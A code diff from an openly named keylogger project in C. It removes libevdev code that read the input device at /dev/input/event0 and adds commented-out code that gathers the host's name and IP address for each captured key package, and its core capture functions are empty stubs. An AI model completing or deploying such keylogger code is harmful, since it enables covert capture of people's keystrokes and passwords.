@@ -21,6 +21,12 @@
 #include <time.h>
 #include <unistd.h>
 
+// #include <netdb.h>  // display hostname
+// #include <sys/types.h>  // display hostname
+// #include <sys/socket.h>  // display hostname
+// #include <netinet/in.h>  // display hostname
+// #include <arpa/inet.h>  // display hostname
+
 void begin_keylogger(void) {
   // IMPLEMENTATION HERE
 }
@@ -29,34 +35,58 @@ void end_keylogger(void) {
   // IMPLEMENTATION HERE
 }
 
-// TODO: this currently doesn't work as expected, since it utilizes the device
-// of the event. Event 0 represents the lid of the laptop
+// // Returns hostname for the local computer
+// void checkHostName(int hostname)
+// {
+// 	if (hostname == -1)
+// 	{
+// 		perror("gethostname");
+// 		exit(1);
+// 	}
+// }
+
+// // Returns host information corresponding to host name
+// void checkHostEntry(struct hostent * hostentry)
+// {
+// 	if (hostentry == NULL)
+// 	{
+// 		perror("gethostbyname");
+// 		exit(1);
+// 	}
+// }
+
+// // Converts space-delimited IPv4 addresses
+// // to dotted-decimal format
+// void checkIPbuffer(char *IPbuffer)
+// {
+// 	if (NULL == IPbuffer)
+// 	{
+// 		perror("inet_ntoa");
+// 		exit(1);
+// 	}
+// }
+
 void log_device(key_package* key_package) {
-  struct libevdev* dev;
-  int rc;
+  // char hostbuffer[256];
+	// char *IPbuffer;
+	// struct hostent *host_entry;
+	// int hostname;
 
-  // open a new device from the file descriptor and initialize
-  int fd = open("/dev/input/event0", O_RDONLY | O_NONBLOCK);
-  if (fd < 0) {
-    printf("error opening event0 %d\n", EXIT_FAILURE);
-    fprintf(stderr, "error opening file: %d %s\n", errno, strerror(errno));
-    exit(0);
-  }
-  rc = libevdev_new_from_fd(fd, &dev);
-  if (rc < 0) {
-    fprintf(stderr, "error with setting rc: %d %s\n", -rc, strerror(-rc));
-    exit(0);
-  }
+	// // To retrieve hostname
+	// hostname = gethostname(hostbuffer, sizeof(hostbuffer));
+	// checkHostName(hostname);
 
-  // Use the getter functions to gather info about the device
-  // printf("Device: %s | vendor: %x | product: %x\n", libevdev_get_name(dev),
-  //        libevdev_get_id_vendor(dev), libevdev_get_id_product(dev));
+	// // To retrieve host information
+	// host_entry = gethostbyname(hostbuffer);
+	// checkHostEntry(host_entry);
 
-  key_package->device_info = libevdev_get_name(dev);  // could prob include more info here. not sure how useful this is.
+	// // To convert an Internet network
+	// // address into ASCII string
+	// IPbuffer = inet_ntoa(*((struct in_addr*)
+	// 					host_entry->h_addr_list[0]));
 
-  // clean up
-  libevdev_free(dev);
-  close(fd);
+  // key_package->host_device_name = hostbuffer;
+  // key_package->host_device_IP = IPbuffer;
 }
 
 void handle_syn_dropped(struct libevdev* dev) {
